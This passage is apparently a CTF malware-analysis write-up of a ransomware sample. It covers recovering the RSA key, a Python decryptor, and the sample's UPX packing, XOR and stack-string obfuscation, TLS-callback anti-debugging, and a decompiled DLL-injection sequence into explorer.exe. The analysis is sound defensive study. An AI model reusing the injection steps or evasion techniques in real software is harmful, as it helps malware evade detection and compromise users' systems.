So let's execute it...
- ![[Pasted image 20240602173904.png]]

The result will be:
- ![[Pasted image 20240602173947.png]]



So now let's analyze `decryptor.dll`

## decryptor.dll analysis with ILSpy 
We open the file using ILSpy and we can see:
- ![[Pasted image 20240602174232.png]]

It has a `Decrypt` function that is what we want to reproduce...

### Decrypt function analysis
We can have a look at it and we can see:
- ![[Pasted image 20240602174327.png]]

Basically it:
1. <mark style="background: #FF5582A6;">uses RSA</mark>
	1. ![[Pasted image 20240602174423.png]]
2.<mark style="background: #FF5582A6;"> loads a key from the resources</mark>
	1. ![[Pasted image 20240602174507.png]]
3. <mark style="background: #FF5582A6;">iterates on all files in the current directory and takes in count only the ones that ends with</mark> `.encrypted`
	1. ![[Pasted image 20240602174546.png]]
4. <mark style="background: #FF5582A6;">decrypts all the bytes using</mark> `RSA`<mark style="background: #FF5582A6;"> with the key loaded from resources and using</mark> `Oaep SHA256` <mark style="background: #FF5582A6;">padding</mark>
	1. ![[Pasted image 20240602174720.png]]
5. <mark style="background: #FF5582A6;">deletes the current decrypted</mark> `.encrypted` <mark style="background: #FF5582A6;">file</mark>
	1. ![[Pasted image 20240602174757.png]]


So at this point we have the algorithm but we need the key...

### RSA key extraction
We have seen that the key is loaded from the resources... So let's take a look on them:
- ![[Pasted image 20240602174910.png]]


<mark style="background: #BBFABBA6;">We got it...</mark>

Let's save it as `key.pem`:
- ![[Pasted image 20240602174950.png]] 
- ![[Pasted image 20240602175034.png]]



## Decrypt function reproducing in python

We have all the pieces together, so let's write a python script that decrypts the `flag.txt.encrypted` file, following the `Decrypt` function we have studied before...

```python
import os
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Hash import SHA256


with open("key.pem", "r") as key_file:
    key_data = key_file.read()
    rsa_key = RSA.import_key(key_data)

for file_name in os.listdir(os.getcwd()):
    if file_name.endswith(".encrypted"):
        with open(file_name, "rb") as encrypted_file:
            encrypted_data = encrypted_file.read()
            cipher_rsa = PKCS1_OAEP.new(rsa_key, hashAlgo=SHA256)
            decrypted_data = cipher_rsa.decrypt(encrypted_data)
            print(decrypted_data)
```

So here we:
1. <mark style="background: #BBFABBA6;"> load the key from the file</mark> `key.pem`
2. <mark style="background: #BBFABBA6;">we get all the files in the folder that ends with</mark> `.encrypted`
3. <mark style="background: #BBFABBA6;">we read the content of the file</mark>
4. <mark style="background: #BBFABBA6;">we create a cipher</mark>
	1. ==**note that here we are using**== `PKCS1_OAEP.new(rsa_key, hashAlgo=SHA256)` because we want as in the original code the ==**OAEP SHA256 padding**==
	2. <mark style="background: #BBFABBA6;">we decrypt the file content using the cipher and print it</mark>



So we run it:
- ![[Pasted image 20240602180343.png]]

And the result is:
- ![[Pasted image 20240602180425.png]]


It seems to work and finally we get the flag :)

<mark style="background: #BBFABBA6;">The flag for this part is:</mark> `FLG_PT4{wh0_n33ds_h0ll0w1ng_wh3n_y0u_h4ve_r3h0st1ng}`



## Discussion of windows binary
The `.exe` file that we analyzed is actually a ransomware program. This ransomware uses RSA encryption to lock up all .txt files in the directory where it runs.

### How It Works

The ransomware pretends to be a regular program, but once it’s executed, it starts its malicious activities aimed at encrypting user files and demanding a ransom.

##### Encryption
The encryption process is based on these stages:
1. **Scanning for Files**: The ransomware searches the current directory for all .txt files.
2. **Usage of a module to encrypt the files**: It retrieves from a remote server a module used to encryp these files.
3. **Encrypting Files**: It reads each .txt file and encrypts it with the RSA public key. The original files are then replaced with their encrypted versions, making them unreadable without the private key.

### Dynamic Module Loading

This ransomware doesn't contain all the code needed for encryption within the executable. Instead, it dynamically loads these modules from a remote server. 
This allows the malware to have a:
1. **Evasion**: By not having all the encryption code in the `.exe`, it’s harder for antivirus software to detect it.
2. **Flexibility**: The ransomware can update its encryption methods by fetching new modules from the server.

#### gRPC Server Interaction
1. **Connecting**: The ransomware connects to a gRPC server after loading some internal packed information (packed using `UPX` ).
2. **Requesting Modules**: It requests the necessary encryption modules from the server.
3. **Loading and Encrypting**: The ransomware loads these modules into memory and uses them to encrypt the .txt files.

### Summary
The RSA encryption ensures that files can’t be decrypted without the private key, making it nearly impossible to recover the files without paying the ransom. The dynamic loading of encryption modules from a gRPC server makes the ransomware more adaptable and harder to detect.


### Packing and obfuscation
During the analysis, we discovered several techniques used for obfuscating and packing the ransomware:
- **Code Packing with UPX**: The ransomware uses UPX (Ultimate Packer for Executables) to pack the code responsible for loading modules from the remote server.ù
	- In addition the packing was made difficult to reverse since the malware author changed the headers of the packed sections in order to make the direct reversing using `UPX` impossible. 
	- We  had to adjust the headers in order to make the `UPX` decompressor work on the binary file.
- **XOR Encryption**: The dynamically loaded code is encrypted using XOR encryption. This method involves combining the code with a key using the XOR operation, which obscures the code and makes it unreadable until it is decrypted during runtime.
	- In this specific case the XORing was done using a key equal to `WANNALMAO` on the resource dinamically loaded called `verysus102` that contains basically the source code of the ransomware at all and the code needed to perform the encryption of the files.
- **Stack Strings**: The key used for the XOR encryption, `WANNALMAO`, is stored using stack strings. This technique places parts of the key on the stack rather than in the data section, making it harder to detect through static analysis.
	- With this technique the malware author was able to construct in a dynamic way the key `WANNALMAO` instead of putting it directly in the code, since it was constructed putting each byte (and so each char) in contigous memory locations.
	- It this case was easy to retrieve it by converting the bytes into chars and having a look at the contigous variable declared in the code.
- **TLS callback functions**: The ransomware uses a TLS callback function to execute malicious code before the entry point of a function.
	- This technique is used to avoid the possibility for the debugger to have access to this malicious code and analysze it since it is executed before getting the entry point of functions, so it is not possible for a debug to break on it.
		- ![[Pasted image 20240619161135.png]]
- **Anti-Debugging Techniques**: The ransomware employs several methods to detect if it is being debugged. 
	- In this specific case it seems to use some API calls to understand if the execution was under debugging or not
	- However this techniques are used to avoid dynamic analysis on the malware execution and are managed using function calls as we can see here:
		- ![[Pasted image 20240619160801.png]]


However for more details on these section look at the previosu sections of the report, where these information are reported in a more detailed way, since we need to study them in order to have the possibility to get the flags...

### Process injection
If we study the code of the unpacked `WANNALMAO.exe` file we can notice that it uses the `process injection` technique to inject code into another process that it this case turns to be `explorer.exe`...

To understand it we have to take look at `WANNALMAO_InjectRuntimeHost` function:
- ![[Pasted image 20240609162045.png]]


So what it happens here is:

1. **Get the Target Process ID**:
	1. `dwProcessId = WANNALMAO_GetProcessIdByName(PTR_s_explorer.exe_140097000);`
		1. The `WANNALMAO_GetProcessIdByName` function retrieves the ID of the target process. If it fails to find the process ID, it calls `WANNALMAO_ErrorAndExit` to terminate execution.
2. **Open the Target Process**:
	1. `DAT_140098518 = OpenProcess(0x43a, 0, dwProcessId);`
		1. The `OpenProcess` function opens the target process with the specified access rights (0x43a) and returns a handle to the process. If the handle is invalid, it calls `WANNALMAO_ErrorAndExit` to terminate execution.
3. **Get the Address of `LoadLibraryA` Function**:
	1. `lpStartAddress = (LPTHREAD_START_ROUTINE) WANNALMAO_GetFunctionAddress(DAT_140098518, "kernel32.dll", "LoadLibraryA");`
		1. The `WANNALMAO_GetFunctionAddress` function retrieves the address of the `LoadLibraryA` function within the target process. 
		2. If it fails to obtain the address, it calls `WANNALMAO_ErrorAndExit` to terminate execution.
    
4. **Allocate Memory in the Target Process**:
	1. `sVar2 = strlen(&DAT_140098520); lpBaseAddress = VirtualAllocEx(DAT_140098518, (LPVOID)0x0, sVar2, 0x3000, 4);`
		1. The `VirtualAllocEx` function allocates memory in the target process. The base address of the allocated memory is stored in `lpBaseAddress`. 
		2. If allocation fails, it calls `WANNALMAO_ErrorAndExit` to terminate execution.
5. **Write to the Allocated Memory in the Target Process**:
	1. `BVar1 = WriteProcessMemory(DAT_140098518, lpBaseAddress, &DAT_140098520, sVar2, (SIZE_T *)0x0);`
		1. The `WriteProcessMemory` function writes data from `&DAT_140098520` into the allocated memory `lpBaseAddress` in the target process. 
		2. If writing fails, it calls `WANNALMAO_ErrorAndExit` to terminate execution.
    
6. **Create a Remote Thread in the Target Process**:
	1. `hHandle = CreateRemoteThread(DAT_140098518, (LPSECURITY_ATTRIBUTES)0x0, 0, lpStartAddress, lpBaseAddress, 0, (LPDWORD)0x0);`
		1. The `CreateRemoteThread` function creates a new thread in the target process. This thread executes the `LoadLibraryA` function with `lpBaseAddress` as the parameter.
		2. If thread creation fails, it calls `WANNALMAO_ErrorAndExit` to terminate execution.
    
7.  **Wait for the Remote Thread to Complete**:
	1. `WaitForSingleObject(hHandle, 0xffffffff);`
		1. The `WaitForSingleObject` function waits until the remote thread completes execution.



All these functions are API functions provided by Windows and contained in the library `kernel32.dll`:
- OpenProcess
- VirtualAllocEx
- WriteProcessMemory
- CreateRemoteThread
- WaitForSingleObject

They are generally used to perform `process injection` or in general to perform process manipulation...


